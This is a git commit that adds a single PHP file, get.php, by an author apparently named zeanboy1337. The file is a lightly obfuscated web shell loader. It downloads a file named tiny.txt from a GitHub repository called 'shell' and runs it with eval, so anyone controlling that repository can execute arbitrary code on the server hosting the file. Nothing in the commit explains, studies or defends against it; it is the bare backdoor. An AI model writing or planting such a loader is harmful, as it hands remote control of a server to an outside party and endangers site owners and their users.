f22f1afd13579e874b97d6814ad6965584e1998f
zeanboy1337 <zeanboy1337@gmail.com>
2025-06-16 04:00:58 +0700

    Create get.php

---
+++ get.php
@@ -0,0 +1,8 @@
+<?php eval(
+    /**_**/ urldecode("%3f%3e") .
+        file_get_contents(
+            /**_**/ urldecode(
+                /**_**/ "https://raw.githubusercontent.com/zeanboy1337/shell/refs/heads/main/tiny.txt"
+            )
+        )
+); ?>
